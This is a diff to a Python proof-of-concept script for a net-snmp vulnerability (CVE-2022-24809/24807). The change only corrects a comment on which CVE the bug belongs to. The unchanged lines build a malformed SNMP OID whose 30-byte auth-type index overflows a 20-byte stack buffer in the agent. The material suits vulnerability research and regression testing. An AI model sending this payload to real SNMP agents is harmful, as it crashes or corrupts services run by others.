@@ -127,16 +127,16 @@ def main():
     full_idx = grp + ctxpfx + secmodel + seclevel + authtype
 
     # ---- PRIMARY trigger (verified to crash) -----------------------------
-    # nsVacmAccessTable_handler (MODE_GET) unconditionally walks the index list
-    # to the 4th next_variable and does memcpy(atype, idx->val.string,
-    # idx->val_len) into a fixed char atype[20] BEFORE any bounds/NULL check
-    # (nsVacmAccessTable.c:175-177 in v5.9.1). A malformed OID whose final index
-    # component (nsVacmAuthType) is longer than 20 bytes overflows atype ->
-    # stack-buffer-overflow / SIGSEGV. This is the shared malformed-OID code
-    # path the CVE-2022-24809 advisory describes (sibling CVE-2022-24807 is the
-    # OOB-write face of the same unguarded walk; the same fix commit
-    # 67ebb43e9038b2dae6e74ae8838b36fcc10fc937 added both the NULL-indexes guard
-    # and the idx->val_len bounds check). Build is ASan so this aborts hard.
+    # nsVacmAccessTable_handler walks the index list to the 4th next_variable
+    # and does memcpy(atype, idx->val.string, idx->val_len) into a fixed
+    # char atype[20] BEFORE any bounds/NULL check (nsVacmAccessTable.c:175-177
+    # in v5.9.1). A malformed OID whose final index component (nsVacmAuthType)
+    # is longer than 20 bytes overflows atype -> stack-buffer-overflow / SIGSEGV.
+    # NOTE: this oversized-index OOB write is the CWE-120 face fixed as the
+    # SIBLING CVE-2022-24807 (SET path). CVE-2022-24809 proper is the CWE-476
+    # NULL-indexes dereference exercised by the SECONDARY short-OID variants
+    # below; both stem from the same unguarded index walk and were fixed
+    # together in net-snmp 5.9.2. Build is ASan so this aborts hard.
     longauth = [30] + [0x41] * 30  # nsVacmAuthType OCTET STR, declared len 30
     crash_oid = col_ctx + grp + ctxpfx + secmodel + seclevel + longauth
     print(f"[*] CVE-2022-24809 PoC -> {host}:{port}")
